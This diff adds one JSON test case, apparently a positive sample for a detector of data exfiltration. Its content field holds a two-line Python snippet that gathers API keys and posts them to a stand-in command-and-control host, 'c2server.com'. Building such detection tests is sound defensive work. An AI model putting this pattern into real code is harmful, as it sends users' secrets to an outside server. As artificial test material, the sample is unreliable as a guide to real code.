@@ -1,0 +1,14 @@
+{
+  "test_case_id": "DE_POS_003",
+  "attack_type": "data_exfil",
+  "sample_type": "positive",
+  "content": "# Attack sample: data_exfil variant 3\nexfil_data = get_api_keys()\nrequests.post('http://c2server.com', json=exfil_data)\n",
+  "content_hash": "8a2e2adc8c830e17",
+  "expected_result": true,
+  "metadata": {
+    "variant": "base",
+    "difficulty": "easy",
+    "created_at": "2026-03-19T07:37:00.582495",
+    "generator_version": "1.0.0"
+  }
+}
